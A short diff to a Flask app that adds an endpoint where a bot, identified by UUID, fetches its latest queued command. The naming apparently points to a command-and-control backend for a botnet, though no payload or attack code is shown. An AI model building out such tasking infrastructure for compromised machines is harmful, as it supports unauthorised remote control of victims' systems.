@@ -3,6 +3,10 @@ from flask import Blueprint, request
 from datetime import datetime as dt
 
 from models.bot import Bot
+from models.command import Command
+
+from schemas.command import cmd_schema
+
 from utils.database import database
 
 bots = Blueprint("bots", __name__)
@@ -76,3 +80,19 @@ def update_bot():
 	finally:
 
 		return { "success": success_code }
+
+
+@bots.route("/api/bot/<uuid>/command", methods=["GET"])
+def get_command(uuid):
+
+	bot = Bot.query.get(uuid)
+
+	if not bot:
+
+		return { "success": 0 }
+
+	# Get last command
+
+	cmd = bot.commands.order_by(Command.timestamp.desc()).first()
+
+	return cmd_schema.jsonify(cmd)
